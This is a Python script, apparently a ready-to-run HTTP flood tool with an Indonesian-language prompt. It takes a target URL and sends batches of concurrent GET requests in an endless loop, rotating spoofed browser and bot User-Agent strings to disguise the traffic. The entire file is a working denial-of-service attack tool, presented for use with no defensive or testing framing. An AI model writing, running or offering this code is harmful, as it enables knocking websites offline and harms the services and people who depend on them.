#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import aiohttp
import random

USER_AGENTS = [
    # Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0",
    
    # Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    
    # macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.90 Safari/537.36",
    
    # Android
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    
    # iPhone/iPad
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    
    # Bots/Tools 
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/7.79.1",
    "Wget/1.21.1"
]

def get_user_input():
    print("""
╔════════════════════════════════════════════════════╗
║        🔥 SIMPLE ASYNC HTTP FLOOD TOOLS  🔥        ║
║            Powered by Python & aiohttp             ║
╚════════════════════════════════════════════════════╝
""")

    target_url = input("Masukkan URL target (contoh: http://example.com): ").strip()

    if not target_url.startswith("http"):
        print("URL harus diawali dengan http:// atau https://")
        exit()

    try:
        total_requests = int(input("Masukkan total jumlah request per batch: "))
        concurrent_requests = int(input("Masukkan jumlah koneksi bersamaan (seperti thread): "))
    except ValueError:
        print("Jumlah harus berupa angka.")
        exit()

    return target_url, total_requests, concurrent_requests

async def send_request(session, url):
    headers = {
        "User-Agent": random.choice(USER_AGENTS)
    }
    try:
        async with session.get(url, headers=headers) as response:
            print(f"[+] Status: {response.status}")
    except Exception as e:
        print(f"[-] Error: {type(e).__name__} - {e}")

async def main():
    target_url, total_requests, concurrent_requests = get_user_input()

    connector = aiohttp.TCPConnector(limit=concurrent_requests)
    timeout = aiohttp.ClientTimeout(total=10)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while True:
            tasks = [send_request(session, target_url) for _ in range(total_requests)]
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
